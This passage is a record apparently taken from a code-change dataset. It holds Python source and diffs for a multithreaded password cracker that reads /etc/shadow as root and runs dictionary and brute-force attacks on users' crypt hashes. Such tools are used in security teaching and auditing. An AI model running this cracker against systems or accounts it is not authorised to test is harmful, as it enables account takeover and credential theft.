'U', 'V',\n                  'W', 'X', 'Y', 'Z', ' ')\n\n\ndef create_char_chunk_index_list(num_of_threads: int):\n    counter = ZERO\n    chunk_index = []\n    chunk_list = np.array_split(characters_map, num_of_threads)\n\n    for chunk in chunk_list:\n        for letter in characters_map:\n            if chunk[0] == letter:\n                chunk_index.append(counter)\n                break\n            counter += 1\n\n    return chunk_index\n\n\ndef brute_force(salt, user_hash, max_attempts):\n    print(BRUTE_FORCE_ATK_MSG)\n    attempts = ZERO\n\n    for length in range(START_LENGTH, MAX_CHAR_LENGTH):\n        for guess in itertools.product(characters_map, repeat=length):\n            attempts += 1\n            password = ''.join(guess)\n\n            if crypt.crypt(password, salt) == user_hash:\n                print(f\"[+] CRACK COMPLETE: Password has been found!\")\n                print(f\"[+] Number of Attempts Made: {attempts}\")\n                return password, attempts\n\n            if attempts == max_attempts:\n                print(f\"[+] CRACK FAILED: Max attempts of {max_attempts} has been reached!\")\n                password = None\n                return password, attempts\n\n            # print(f\"[+] Attempt {attempts}: {password}\")\n\n\n# HYPOTHESIS: Heavily Compute-Bound Functions in Multi-threading will result in decrease performance\n# Threads operate in parallel; this - the CPU has to maintain the original workload for each thread.\ndef brute_force_multithread(salt, user_hash, max_attempts, thread_id: int, index_start: int, bf_pw_deque: deque,\n                            bf_total_time_q: queue.Queue, bf_total_attempt_q: queue.Queue, bf_pw_lock: threading.Lock,\n                            bf_time_lock: threading.Lock, bf_attempt_lock: threading.Lock):\n    # Print to specify which starting index\n    print(f\"[+] [Thread {thread_id}] - Starting guess at the following character: {characters_map[index_start]}\")\n\n    # Start Timer\n    s_time = time.process_time()\n    attempts = ZERO\n\n    for length in range(START_LENGTH, MAX_CHAR_LENGTH):\n        for guess in itertools.product(characters_map[index_start:], repeat=length):\n            attempts += 1\n\n            # SIGNAL - Check if password is found\n            if len(bf_pw_deque) is not ZERO:\n                for pw in bf_pw_deque:\n                    if pw is not None:\n                        total_time = (time.process_time() - s_time)\n                        _put_in_queue(attempts, bf_attempt_lock, bf_total_attempt_q)\n                        _put_in_queue(total_time, bf_time_lock, bf_total_time_q)\n                        print(f\"[+] [Thread {thread_id}] Number of Attempts Made: {attempts}\")\n                        print(f\"[+] [Thread {thread_id}] Time: {total_time} seconds\")\n                        print(f\"[+] [Thread {thread_id}] - PW FOUND: Now Terminating...\")\n                        return None\n\n            password = ''.join(guess)\n\n            if crypt.crypt(password, salt) == user_hash:\n                total_time = (time.process_time() - s_time)\n\n                print(f\"[+] [PW Thread {thread_id}] CRACK COMPLETE: Password has been found!\")\n                print(f\"[+] [PW Thread {thread_id}] Number of Attempts Made: {attempts}\")\n                print(f\"[+] [PW Thread {thread_id}] Time: {total_time} seconds\")\n\n                _put_in_queue(attempts, bf_attempt_lock, bf_total_attempt_q)\n                _put_in_queue(total_time, bf_time_lock, bf_total_time_q)\n                _put_in_deque(password, bf_pw_lock, bf_pw_deque)\n\n                return password, attempts\n\n            if attempts == max_attempts:\n                total_time = (time.process_time() - s_time)\n\n                print(f\"[+] [Thread {thread_id}] CRACK FAILED: Max attempts of {max_attempts} has been reached!\")\n                print(f\"[+] [Thread {thread_id}] Time: {total_time} seconds\")\n\n                password = None\n\n                _put_in_queue(attempts, bf_attempt_lock, bf_total_attempt_q)\n                _put_in_queue(total_time, bf_time_lock, bf_total_time_q)\n                _put_in_deque(password, bf_pw_lock, bf_pw_deque)\n\n                return password, attempts\n\n            # print(f\"[+] [Thread {thread_id}] Attempt {attempts}: {password}\")\n\n    # If no password was found within range(given index -> end)\n    total_time = (time.process_time() - s_time)\n    password = None\n    _put_in_queue(attempts, bf_attempt_lock, bf_total_attempt_q)\n    _put_in_queue(total_time, bf_time_lock, bf_total_time_q)\n    _put_in_deque(password, bf_pw_lock, bf_pw_deque)\n\n\ndef _put_in_deque(x, lock, some_deque: deque):\n    lock.acquire()\n    some_deque.append(x)\n    lock.release()\n\n\ndef _put_in_queue(x, lock, some_queue):\n    lock.acquire()\n    some_queue.put(x)\n    lock.release()\n\n# SOURCE USED: https:\/\/stackoverflow.com\/questions\/40269605\/how-to-create-a-brute-force-password-cracker-for-alphabetical-and-alphanumerical\n"},"\/main.py":{"changes":[{"diff":"\n import queue\n+import signal\n from concurrent.futures import ThreadPoolExecutor\n+from multiprocessing import Process\n import Algorithms\n-from collections import deque\n import cpuinfo\n+\n+import constants\n from constants import WELCOME_MSG, WELCOME_DECORATION, DICTIONARY_ATK_MSG, ZERO, TWO, BACK_TO_START, BRUTE_FORCE_LAUNCH, \\\n     PROGRAM_TERMINATE_MSG_1, PROGRAM_TERMINATE_MSG_2\n-from Cracker import brute_force_multithread, create_char_chunk_index_list, BRUTE_FORCE_ATK_MSG\n+from Cracker import *\n import crypt\n import getopt\n import multiprocessing\n","add":5,"remove":2,"filename":"\/main.py","badparts":["from collections import deque","from Cracker import brute_force_multithread, create_char_chunk_index_list, BRUTE_FORCE_ATK_MSG"],"goodparts":["import signal","from multiprocessing import Process","import constants","from Cracker import *"]},{"diff":"\n     print(f\"[+] Number of Cores Available: {multiprocessing.cpu_count()}\")\n \n \n-def init_variables():\n-    brute_force_attempts = ZERO\n-    brute_force_flag = False\n-    thread_total_attempts = ZERO\n-    total_brute_force_attempts = ZERO\n-    total_attempts = ZERO\n-    total_attempt_lock = threading.Lock()\n-    total_thread_time = ZERO\n-    total_thread_time_lck = threading.Lock()\n-    brute_force_counter_lock = threading.Lock()\n-    brute_force_counter = ZERO\n-    password = \"\"\n-    start_time = ZERO\n-    stop_time = ZERO\n-    total_time = ZERO\n-    pw_list_lock = threading.Lock()\n-    pw_queue = queue.Queue()\n-    pw_lck = threading.Lock()\n-    bf_pw_deque = deque()\n-    bf_total_time_queue = queue.Queue()\n-    bf_total_attempt_queue = queue.Queue()\n-    bf_total_thread_time = ZERO\n-    bf_total_thread_attempts = ZERO\n-\n-    return total_attempts, brute_force_attempts, total_brute_force_attempts, thread_total_attempts, brute_force_flag, \\\n-        start_time, stop_time, total_time, password, pw_list_lock, total_attempt_lock, pw_queue, pw_lck, \\\n-        total_thread_time, total_thread_time_lck, brute_force_counter_lock, brute_force_counter, bf_pw_deque,\\\n-        bf_total_time_queue, bf_total_attempt_queue, bf_total_thread_time, bf_total_thread_attempts\n-\n-\n def make_pw_deque(pw_list_dir):\n     global brute_force_flag\n \n","add":0,"remove":30,"filename":"\/main.py","badparts":["def init_variables():","    brute_force_attempts = ZERO","    brute_force_flag = False","    thread_total_attempts = ZERO","    total_brute_force_attempts = ZERO","    total_attempts = ZERO","    total_attempt_lock = threading.Lock()","    total_thread_time = ZERO","    total_thread_time_lck = threading.Lock()","    brute_force_counter_lock = threading.Lock()","    brute_force_counter = ZERO","    password = \"\"","    start_time = ZERO","    stop_time = ZERO","    total_time = ZERO","    pw_list_lock = threading.Lock()","    pw_queue = queue.Queue()","    pw_lck = threading.Lock()","    bf_pw_deque = deque()","    bf_total_time_queue = queue.Queue()","    bf_total_attempt_queue = queue.Queue()","    bf_total_thread_time = ZERO","    bf_total_thread_attempts = ZERO","    return total_attempts, brute_force_attempts, total_brute_force_attempts, thread_total_attempts, brute_force_flag, \\","        start_time, stop_time, total_time, password, pw_list_lock, total_attempt_lock, pw_queue, pw_lck, \\","        total_thread_time, total_thread_time_lck, brute_force_counter_lock, brute_force_counter, bf_pw_deque,\\","        bf_total_time_queue, bf_total_attempt_queue, bf_total_thread_time, bf_total_thread_attempts"],"goodparts":[]},{"diff":"\n         print(f\"[+] Total Thread Attempts (Dictionary Attack): {d_thread_attempts}\")\n         print(f\"[+] Total Thread Time: {round(d_thread_time, 3)} seconds\")\n \n-    print(f\"[+] Time elapsed: {elapsed_time} seconds\")\n+    # print(f\"[+] Time elapsed: {elapsed_time} seconds\")\n \n \n def process_statistics(pw):\n     global stop_time, total_time, dictionary_thread_total_attempts, dictionary_total_thread_time\n \n-    stop_time = time.process_time()\n-    _print_results(round(stop_time - start_time, 2), dictionary_thread_total_attempts, dictionary_total_thread_time)\n+    stop_time = time.perf_counter()\n     total_time += (stop_time - start_time)\n+    _print_results(round(total_time, 2), dictionary_thread_total_attempts, dictionary_total_thread_time)\n \n     if pw != \"\":\n-        print(f\"[+] The password is {pw}\")\n+        print(f\"[+] The password is {constants.BOLD_START}{pw}{constants.BOLD_END}\")\n \n \n def _remove_duplicate_users(cleansed_user_list_args, orig_user_list_args):\n","add":4,"remove":4,"filename":"\/main.py","badparts":["    print(f\"[+] Time elapsed: {elapsed_time} seconds\")","    stop_time = time.process_time()","    _print_results(round(stop_time - start_time, 2), dictionary_thread_total_attempts, dictionary_total_thread_time)","        print(f\"[+] The password is {pw}\")"],"goodparts":["    stop_time = time.perf_counter()","    _print_results(round(total_time, 2), dictionary_thread_total_attempts, dictionary_total_thread_time)","        print(f\"[+] The password is {constants.BOLD_START}{pw}{constants.BOLD_END}\")"]},{"diff":"\n def reset_variables():\n     global start_time, password, dictionary_thread_total_attempts, \\\n         dictionary_total_thread_time, brute_force_counter, pw_deque, \\\n-        bf_pw_deque, bf_total_time_queue, bf_total_attempt_queue, bf_total_thread_time\n+        bf_pw_deque, bf_total_time_queue, bf_total_attempt_queue, bf_total_thread_time, \\\n+        processes\n \n-    start_time = time.process_time()\n+    start_time = time.perf_counter()\n     password = None\n     shadow_file.seek(BACK_TO_START)\n     dictionary_thread_total_attempts = ZERO\n","add":3,"remove":2,"filename":"\/main.py","badparts":["        bf_pw_deque, bf_total_time_queue, bf_total_attempt_queue, bf_total_thread_time","    start_time = time.process_time()"],"goodparts":["        bf_pw_deque, bf_total_time_queue, bf_total_attempt_queue, bf_total_thread_time, \\","        processes","    start_time = time.perf_counter()"]},{"diff":"\n     bf_total_thread_time = ZERO\n     pw_deque = backup_deque.copy()\n     pw_queue.empty()\n-    bf_pw_deque.clear()\n+    bf_pw_deque.empty()\n     bf_total_time_queue.empty()\n     bf_total_attempt_queue.empty()\n+    processes.clear()\n \n \n def user_not_found_check(user_info, user_list, user_name, file_dir):\n","add":2,"remove":1,"filename":"\/main.py","badparts":["    bf_pw_deque.clear()"],"goodparts":["    bf_pw_deque.empty()","    processes.clear()"]},{"diff":"\n     return start_index_list, bf_pw_lock, bf_total_time_lock, bf_total_attempt_lock\n \n \n-def bf_pw_results_check():\n+def bf_pw_results_check(process_list: list[multiprocessing.Process]):\n     global password, bf_pw_deque, num_of_threads\n \n-    while len(bf_pw_deque) != num_of_threads:\n+    while bf_pw_deque.qsize() != num_of_threads:\n         break\n \n-    for item in bf_pw_deque:\n+    while True:  # CONSTRAINT: Since processes end so fast, wait 3 seconds before killing each process.\n+        item = bf_pw_deque.get()\n         if item is not None:\n+            for process in process_list:\n+                time.sleep(3)\n+                os.kill(process.pid, signal.SIGKILL)\n             password = item\n+            break\n \n \n # Main Program\n if __name__ == \"__main__\":\n     # Declare Variables\n-    total_attempts, brute_force_attempts, total_brute_force_attempts, dictionary_thread_total_attempts, \\\n-        brute_force_flag, start_time, stop_time, total_time, password, pw_list_lock, \\\n-        total_attempt_lock, pw_queue, pw_lck, dictionary_total_thread_time, total_thread_time_lck,\\\n-        brute_force_counter_lock, brute_force_counter, bf_pw_deque, bf_total_time_queue, \\\n-        bf_total_attempt_queue, bf_total_thread_time, bf_total_thread_attempts = init_variables()\n+    brute_force_attempts = ZERO\n+    brute_force_flag = False\n+    thread_total_attempts = ZERO\n+    total_brute_force_attempts = ZERO\n+    total_attempts = ZERO\n+    total_attempt_lock = threading.Lock()\n+    total_thread_time = ZERO\n+    total_thread_time_lck = threading.Lock()\n+    brute_force_counter_lock = threading.Lock()\n+    brute_force_counter = ZERO\n+    password = \"\"\n+    start_time = ZERO  # Time (main) gets suspended when entering a process\n+    stop_time = ZERO\n+    total_time = ZERO\n+    pw_list_lock = threading.Lock()\n+    pw_queue = Queue()\n+    pw_lck = threading.Lock()\n+    bf_pw_deque = Queue()\n+    bf_total_time_queue = Queue()\n+    bf_total_attempt_queue = Queue()\n+    bf_total_thread_time = ZERO\n+    bf_total_thread_attempts = ZERO\n \n     # Initialize Program\n     display_welcome_msg()\n","add":30,"remove":8,"filename":"\/main.py","badparts":["def bf_pw_results_check():","    while len(bf_pw_deque) != num_of_threads:","    for item in bf_pw_deque:","    total_attempts, brute_force_attempts, total_brute_force_attempts, dictionary_thread_total_attempts, \\","        brute_force_flag, start_time, stop_time, total_time, password, pw_list_lock, \\","        total_attempt_lock, pw_queue, pw_lck, dictionary_total_thread_time, total_thread_time_lck,\\","        brute_force_counter_lock, brute_force_counter, bf_pw_deque, bf_total_time_queue, \\","        bf_total_attempt_queue, bf_total_thread_time, bf_total_thread_attempts = init_variables()"],"goodparts":["def bf_pw_results_check(process_list: list[multiprocessing.Process]):","    while bf_pw_deque.qsize() != num_of_threads:","    while True:  # CONSTRAINT: Since processes end so fast, wait 3 seconds before killing each process.","        item = bf_pw_deque.get()","            for process in process_list:","                time.sleep(3)","                os.kill(process.pid, signal.SIGKILL)","            break","    brute_force_attempts = ZERO","    brute_force_flag = False","    thread_total_attempts = ZERO","    total_brute_force_attempts = ZERO","    total_attempts = ZERO","    total_attempt_lock = threading.Lock()","    total_thread_time = ZERO","    total_thread_time_lck = threading.Lock()","    brute_force_counter_lock = threading.Lock()","    brute_force_counter = ZERO","    password = \"\"","    start_time = ZERO  # Time (main) gets suspended when entering a process","    stop_time = ZERO","    total_time = ZERO","    pw_list_lock = threading.Lock()","    pw_queue = Queue()","    pw_lck = threading.Lock()","    bf_pw_deque = Queue()","    bf_total_time_queue = Queue()","    bf_total_attempt_queue = Queue()","    bf_total_thread_time = ZERO","    bf_total_thread_attempts = ZERO"]},{"diff":"\n                     print(BRUTE_FORCE_ATK_MSG)\n                     start_index_list, bf_pw_lock, bf_total_time_lock, bf_total_attempt_lock = init_bf_variables()\n \n-                    with ThreadPoolExecutor() as executor:\n-                        thread_id = 1\n-                        for index in range(len(start_index_list)):\n-                            executor.submit(brute_force_multithread, salt, user_hash, max_attempts, thread_id,\n-                                            start_index_list[index], bf_pw_deque, bf_total_time_queue,\n-                                            bf_total_attempt_queue, bf_pw_lock, bf_total_time_lock,\n-                                            bf_total_attempt_lock)\n-                            thread_id += 1\n-\n-                    # WHILE LOOP for password\n-                    bf_pw_results_check()\n-\n-                    # WHILE LOOP (TIME) to wait for length of time queue to be equal to total number of threads\n-                    while bf_total_time_queue.qsize() != num_of_threads:\n-                        break\n+                    thread_id = 1\n+                    for index in range(len(start_index_list)):\n+                        proc = Process(target=brute_force_multithread, args=(salt, user_hash, max_attempts, thread_id,\n+                                                                             start_index_list[index], bf_pw_deque,\n+                                                                             bf_total_time_queue,\n+                                                                             bf_total_attempt_queue, bf_pw_lock,\n+                                                                             bf_total_time_lock,\n+                                                                             bf_total_attempt_lock))\n+                        thread_id += 1\n+                        processes.append(proc)\n+                        proc.start()\n+\n+                    # Wait until password has been found\n+                    bf_pw_results_check(processes)\n \n                     for i in range(bf_total_time_queue.qsize()):\n                         bf_total_thread_time += bf_total_time_queue.get()\n","add":14,"remove":15,"filename":"\/main.py","badparts":["                    with ThreadPoolExecutor() as executor:","                        thread_id = 1","                        for index in range(len(start_index_list)):","                            executor.submit(brute_force_multithread, salt, user_hash, max_attempts, thread_id,","                                            start_index_list[index], bf_pw_deque, bf_total_time_queue,","                                            bf_total_attempt_queue, bf_pw_lock, bf_total_time_lock,","                                            bf_total_attempt_lock)","                            thread_id += 1","                    bf_pw_results_check()","                    while bf_total_time_queue.qsize() != num_of_threads:","                        break"],"goodparts":["                    thread_id = 1","                    for index in range(len(start_index_list)):","                        proc = Process(target=brute_force_multithread, args=(salt, user_hash, max_attempts, thread_id,","                                                                             start_index_list[index], bf_pw_deque,","                                                                             bf_total_time_queue,","                                                                             bf_total_attempt_queue, bf_pw_lock,","                                                                             bf_total_time_lock,","                                                                             bf_total_attempt_lock))","                        thread_id += 1","                        processes.append(proc)","                        proc.start()","                    bf_pw_results_check(processes)"]}],"source":"\nimport queue from concurrent.futures import ThreadPoolExecutor import Algorithms from collections import deque import cpuinfo from constants import WELCOME_MSG, WELCOME_DECORATION, DICTIONARY_ATK_MSG, ZERO, TWO, BACK_TO_START, BRUTE_FORCE_LAUNCH, \\ PROGRAM_TERMINATE_MSG_1, PROGRAM_TERMINATE_MSG_2 from Cracker import brute_force_multithread, create_char_chunk_index_list, BRUTE_FORCE_ATK_MSG import crypt import getopt import multiprocessing import os import sys import time import threading def _algorithm_not_found(): print(\"[+] ALGORITHM_NOT_FOUND_ERROR: This algorithm type is not supported!\") print(\"[+] Now checking for next user...\") def async_dictionary_attack(): _create_dictionary_thread_pool() def _calculate_dictionary_thread_time(s_time, thread_id, total_thread_time_lck): global dictionary_total_thread_time total_time=(time.process_time() -s_time) total_thread_time_lck.acquire() dictionary_total_thread_time +=total_time total_thread_time_lck.release() print(f\"[+][Thread{thread_id}] Time:{total_time} seconds\") def _calculate_pw_dictionary_thread_time(s_time, thread_id, total_thread_time_lck): global dictionary_total_thread_time total_time=(time.process_time() -s_time) total_thread_time_lck.acquire() dictionary_total_thread_time +=total_time total_thread_time_lck.release() print(f\"[+][PW Thread{thread_id}] Time:{total_time} seconds\") def _check_args(opts): if len(opts)==ZERO: sys.exit(\"[+] NO_ARG_ERROR: No arguments were passed in!\") def _check_if_files_exists(file_dir, pw_list_dir): try: if not os.path.exists(file_dir): sys.exit(f\"[+] ERROR:{file_dir} Doesn't Exist or Invalid Argument!\") elif not os.path.exists(pw_list_dir) or pw_list_dir==\"\": print(f\"[+] ERROR: Password File Doesn't Exist or Invalid Argument!\") else: print(f\"[+] Now reading the{file_dir} file...\") except FileNotFoundError: sys.exit(\"[+] ERROR: File Doesn't Exist!\") def check_if_root_user(): if not os.geteuid()==0: sys.exit(\"[+] ERROR: Only the 'root' user can run this script \" \"[Please run this script again using sudo command].\") def _check_user_parameters(user_list): if len(user_list)==ZERO: sys.exit(\"[+] No users were passed in as arguments!\") def _check_valid_user(file_entry, user_name, user_list): if '$' not in file_entry and len(user_list) >=TWO: print(f\"[+] INVALID USER:{user_name} is a service, utility, or process and cannot be cracked!\") print(\"[+] Now moving on to the next user...\") return False elif '$' not in file_entry and len(user_list) < TWO: print(f\"[+] INVALID USER:{user_name} is a service, utility, or process and cannot be cracked!\") return False else: return True def _create_dictionary_thread_pool(): with ThreadPoolExecutor() as executor: for i in range(num_of_threads): _execute_dictionary_threads(executor, i) def dictionary_attack_helper(input_hash, input_salt, max_attempt, pw_deque: deque, list_lock: threading.Lock, attempt_lock: threading.Lock, pw_stop_q: queue.Queue, thread_id: int): s_time=time.process_time() global total_attempts, dictionary_thread_total_attempts, dictionary_total_thread_time, total_thread_time_lck attempt=ZERO thread_id +=1 if max_attempt==ZERO: if pw_deque is not None: while len(pw_deque) is not ZERO: list_lock.acquire() pw=str(pw_deque.popleft()).strip() list_lock.release() if crypt.crypt(pw, input_salt)==input_hash: _calculate_pw_dictionary_thread_time(s_time, thread_id, total_thread_time_lck) print(f\"[+][PW Thread{thread_id}] CRACK COMPLETE: Password has been found!\") print(f\"[+][PW Thread{thread_id}] Number of Attempts Made:{attempt}\") list_lock.acquire() pw_deque.clear() list_lock.release() pw_lck.acquire() pw_stop_q.put(pw) pw_lck.release() attempt_lock.acquire() dictionary_thread_total_attempts +=attempt total_attempts +=attempt attempt_lock.release() return pw else: attempt +=1 attempt_lock.acquire() dictionary_thread_total_attempts +=attempt total_attempts +=attempt attempt_lock.release() _calculate_dictionary_thread_time(s_time, thread_id, total_thread_time_lck) if pw_stop_q.empty(): pw_stop_q.put(None) return else: if pw_deque is not None: while len(pw_deque) is not ZERO: list_lock.acquire() pw=str(pw_deque.popleft()).strip() list_lock.release() if crypt.crypt(pw, input_salt)==input_hash: _calculate_pw_dictionary_thread_time(s_time, thread_id, total_thread_time_lck) print(f\"[+][PW Thread{thread_id}] CRACK COMPLETE: Password has been found!\") print(f\"[+][PW Thread{thread_id}] Number of Attempts Made:{attempt}\") list_lock.acquire() pw_deque.clear() list_lock.release() pw_lck.acquire() pw_stop_q.put(pw) pw_lck.release() attempt_lock.acquire() dictionary_thread_total_attempts +=attempt total_attempts +=attempt attempt_lock.release() return pw elif attempt==max_attempt: _calculate_dictionary_thread_time(s_time, thread_id, total_thread_time_lck) print(f\"[+][Thread{thread_id}] CRACK FAILED: Max attempts of{attempt} has been reached!\") attempt_lock.acquire() dictionary_thread_total_attempts +=attempt total_attempts +=attempt attempt_lock.release() pw_stop_q.put(None) return else: attempt +=1 attempt_lock.acquire() dictionary_thread_total_attempts +=attempt total_attempts +=attempt attempt_lock.release() _calculate_dictionary_thread_time(s_time, thread_id, total_thread_time_lck) if pw_stop_q.empty(): pw_stop_q.put(None) return def dictionary_atk_results_check(): global password, num_of_threads while pw_queue.qsize() !=num_of_threads: break pw_queue_list=[] for m in range(pw_queue.qsize()): pw_queue_list.append(pw_queue.get()) for item in pw_queue_list: if item is not None: password=item def _execute_dictionary_threads(executor, i): executor.submit(dictionary_attack_helper, user_hash, salt, max_attempts, pw_deque, list_lock=pw_list_lock, attempt_lock=total_attempt_lock, pw_stop_q=pw_queue, thread_id=i) def _ioerror_handler(file_directory): if file_directory==\"\": print(\"[+] IOError: No password file has been specified in command args!\") else: print(f\"[+] IOError: Cannot open the following password file:{file_directory}!\") def display_welcome_msg(): print(WELCOME_MSG) print(WELCOME_DECORATION) print(f\"[+] CPU Info:{cpuinfo.get_cpu_info()['brand_raw']}\") print(f\"[+] Number of Cores Available:{multiprocessing.cpu_count()}\") def init_variables(): brute_force_attempts=ZERO brute_force_flag=False thread_total_attempts=ZERO total_brute_force_attempts=ZERO total_attempts=ZERO total_attempt_lock=threading.Lock() total_thread_time=ZERO total_thread_time_lck=threading.Lock() brute_force_counter_lock=threading.Lock() brute_force_counter=ZERO password=\"\" start_time=ZERO stop_time=ZERO total_time=ZERO pw_list_lock=threading.Lock() pw_queue=queue.Queue() pw_lck=threading.Lock() bf_pw_deque=deque() bf_total_time_queue=queue.Queue() bf_total_attempt_queue=queue.Queue() bf_total_thread_time=ZERO bf_total_thread_attempts=ZERO return total_attempts, brute_force_attempts, total_brute_force_attempts, thread_total_attempts, brute_force_flag, \\ start_time, stop_time, total_time, password, pw_list_lock, total_attempt_lock, pw_queue, pw_lck, \\ total_thread_time, total_thread_time_lck, brute_force_counter_lock, brute_force_counter, bf_pw_deque,\\ bf_total_time_queue, bf_total_attempt_queue, bf_total_thread_time, bf_total_thread_attempts def make_pw_deque(pw_list_dir): global brute_force_flag if pw_list_dir==\"\": brute_force_flag=True pw_q=deque() try: password_file=open(pw_list_dir, 'r') for line in password_file: pw_q.append(line.strip()) except IOError: _ioerror_handler(pw_list_dir) brute_force_flag=True return pw_q def open_shadow_file(file_dir): try: file=open(file_dir, 'r') return file except IOError: if file_dir==\"\": sys.exit(\"[+] IOError: The '\/etc\/shadow' file is not specified in command args!\") else: sys.exit(f\"[+] IOError: Cannot open the following file:{file_dir}\") def parse_arguments(): cleansed_user_list_args=[] file_directory=\"\" password_list=\"\" num_of_threads=multiprocessing.cpu_count() max_attempts=ZERO arguments=sys.argv[1:] opts, user_list_args=getopt.getopt(arguments, 'f:l:a:t:') _check_args(opts) _check_user_parameters(user_list_args) for opt, argument in opts: if opt=='-f': file_directory=argument if opt=='-l': password_list=argument if opt=='-t': try: if int(argument) < ZERO: print(\"[+] ERROR: Number of threads(-t) cannot be negative integer!\") elif int(argument) > multiprocessing.cpu_count(): print(f\"[+] ERROR: Number of threads(-t) cannot be greater than the \" f\"max number of cores:{multiprocessing.cpu_count()}\") else: num_of_threads=int(argument) except ValueError: sys.exit(f\"[+] Must be an integer for -t option!\") if opt=='-a': try: max_attempts=int(argument) print(f\"[+] MAX ATTEMPTS for each algorithm:{max_attempts}\") except ValueError: sys.exit(f\"[+] Invalid Argument for -a option!\") if num_of_threads==multiprocessing.cpu_count(): print(f\"[+][DEFAULT] Program is now creating and using{num_of_threads} threads...\") else: print(f\"[+][CUSTOM] Program is now creating and using{num_of_threads} threads...\") cleansed_user_list_args=_remove_duplicate_users(cleansed_user_list_args, user_list_args) return file_directory, cleansed_user_list_args, password_list, max_attempts, num_of_threads def print_end(): print(f\"\\n{WELCOME_DECORATION}\") print(PROGRAM_TERMINATE_MSG_1) print(f\"[+] Total Number of Attempts:{total_attempts +total_brute_force_attempts}\") print(f\"[+] Total Time Elapsed:{round(total_time, 2)} seconds\") print(PROGRAM_TERMINATE_MSG_2) def _print_results(elapsed_time, d_thread_attempts, d_thread_time): if d_thread_attempts !=ZERO and d_thread_time !=ZERO: print(f\"[+] Total Thread Attempts(Dictionary Attack):{d_thread_attempts}\") print(f\"[+] Total Thread Time:{round(d_thread_time, 3)} seconds\") print(f\"[+] Time elapsed:{elapsed_time} seconds\") def process_statistics(pw): global stop_time, total_time, dictionary_thread_total_attempts, dictionary_total_thread_time stop_time=time.process_time() _print_results(round(stop_time -start_time, 2), dictionary_thread_total_attempts, dictionary_total_thread_time) total_time +=(stop_time -start_time) if pw !=\"\": print(f\"[+] The password is{pw}\") def _remove_duplicate_users(cleansed_user_list_args, orig_user_list_args): for user in orig_user_list_args: if user not in cleansed_user_list_args: cleansed_user_list_args.append(user) print(f\"[+] The following users are to have their passwords cracked:{cleansed_user_list_args}\") return cleansed_user_list_args def remove_user_from_list(user_list): return user_list[1:] def reset_variables(): global start_time, password, dictionary_thread_total_attempts, \\ dictionary_total_thread_time, brute_force_counter, pw_deque, \\ bf_pw_deque, bf_total_time_queue, bf_total_attempt_queue, bf_total_thread_time start_time=time.process_time() password=None shadow_file.seek(BACK_TO_START) dictionary_thread_total_attempts=ZERO dictionary_total_thread_time=ZERO brute_force_counter=ZERO bf_total_thread_time=ZERO pw_deque=backup_deque.copy() pw_queue.empty() bf_pw_deque.clear() bf_total_time_queue.empty() bf_total_attempt_queue.empty() def user_not_found_check(user_info, user_list, user_name, file_dir): if len(user_info) is ZERO and len(user_list) >=TWO: print(f\"\\n[+] ERROR:{user_name} has not been found in{file_dir}! \" f\"Now moving on to the next user...\\n\") return True elif len(selected_user_info) is ZERO and len(user_list) < TWO: print(f\"\\n[+] ERROR: The last user: '{user_name}' has not been found in{file_dir}!\") return True def init_bf_variables(): start_index_list=create_char_chunk_index_list(num_of_threads) bf_pw_lock=threading.Lock() bf_total_time_lock=threading.Lock() bf_total_attempt_lock=threading.Lock() return start_index_list, bf_pw_lock, bf_total_time_lock, bf_total_attempt_lock def bf_pw_results_check(): global password, bf_pw_deque, num_of_threads while len(bf_pw_deque) !=num_of_threads: break for item in bf_pw_deque: if item is not None: password=item if __name__==\"__main__\": total_attempts, brute_force_attempts, total_brute_force_attempts, dictionary_thread_total_attempts, \\ brute_force_flag, start_time, stop_time, total_time, password, pw_list_lock, \\ total_attempt_lock, pw_queue, pw_lck, dictionary_total_thread_time, total_thread_time_lck,\\ brute_force_counter_lock, brute_force_counter, bf_pw_deque, bf_total_time_queue, \\ bf_total_attempt_queue, bf_total_thread_time, bf_total_thread_attempts=init_variables() display_welcome_msg() file_directory, user_list_args, password_list_dir, max_attempts, num_of_threads=parse_arguments() _check_if_files_exists(file_directory, password_list_dir) pw_deque=make_pw_deque(password_list_dir) backup_deque=pw_deque.copy() shadow_file=open_shadow_file(file_directory) for user in user_list_args: selected_user_info=\"\" reset_variables() for entry in shadow_file: if user==entry.split(':')[0]: print(f\"\\n[+]{user} has been found! Now attempting to determine a suitable hashing algorithm...\") selected_user_info=entry.split('$') if _check_valid_user(entry, user, user_list_args) is False: break algorithm=Algorithms.Algorithm() if algorithm.algorithm_checker(selected_user_info)==Algorithms.Algorithm.ERROR_CODE: _algorithm_not_found() break print(DICTIONARY_ATK_MSG) user_hash=entry.split(':')[1] salt=algorithm.extract_salt(selected_user_info[1], entry) if not brute_force_flag: async_dictionary_attack() dictionary_atk_results_check() if(password is None) or(password is BRUTE_FORCE_LAUNCH): print(BRUTE_FORCE_ATK_MSG) start_index_list, bf_pw_lock, bf_total_time_lock, bf_total_attempt_lock=init_bf_variables() with ThreadPoolExecutor() as executor: thread_id=1 for index in range(len(start_index_list)): executor.submit(brute_force_multithread, salt, user_hash, max_attempts, thread_id, start_index_list[index], bf_pw_deque, bf_total_time_queue, bf_total_attempt_queue, bf_pw_lock, bf_total_time_lock, bf_total_attempt_lock) thread_id +=1 bf_pw_results_check() while bf_total_time_queue.qsize() !=num_of_threads: break for i in range(bf_total_time_queue.qsize()): bf_total_thread_time +=bf_total_time_queue.get() print(f\"[+] Total Thread Time(Brute Force):{bf_total_thread_time} seconds\") while bf_total_attempt_queue.qsize() !=num_of_threads: break for i in range(bf_total_attempt_queue.qsize()): bf_total_thread_attempts +=bf_total_attempt_queue.get() total_brute_force_attempts +=bf_total_thread_attempts print(f\"[+] Total Number of Attempts For All Threads(Brute Force):{bf_total_thread_attempts}\") if user_not_found_check(selected_user_info, user_list_args, user, file_directory): pass else: process_statistics(password) user_list_args=remove_user_from_list(user_list_args) print_end() ","sourceWithComments":"import queue\nfrom concurrent.futures import ThreadPoolExecutor\nimport Algorithms\nfrom collections import deque\nimport cpuinfo\nfrom constants import WELCOME_MSG, WELCOME_DECORATION, DICTIONARY_ATK_MSG, ZERO, TWO, BACK_TO_START, BRUTE_FORCE_LAUNCH, \\\n    PROGRAM_TERMINATE_MSG_1, PROGRAM_TERMINATE_MSG_2\nfrom Cracker import brute_force_multithread, create_char_chunk_index_list, BRUTE_FORCE_ATK_MSG\nimport crypt\nimport getopt\nimport multiprocessing\nimport os\nimport sys\nimport time\nimport threading\n\ndef _algorithm_not_found():\n    print(\"[+] ALGORITHM_NOT_FOUND_ERROR: This algorithm type is not supported!\")\n    print(\"[+] Now checking for next user...\")\n\n\ndef async_dictionary_attack():\n    _create_dictionary_thread_pool()\n\n\ndef 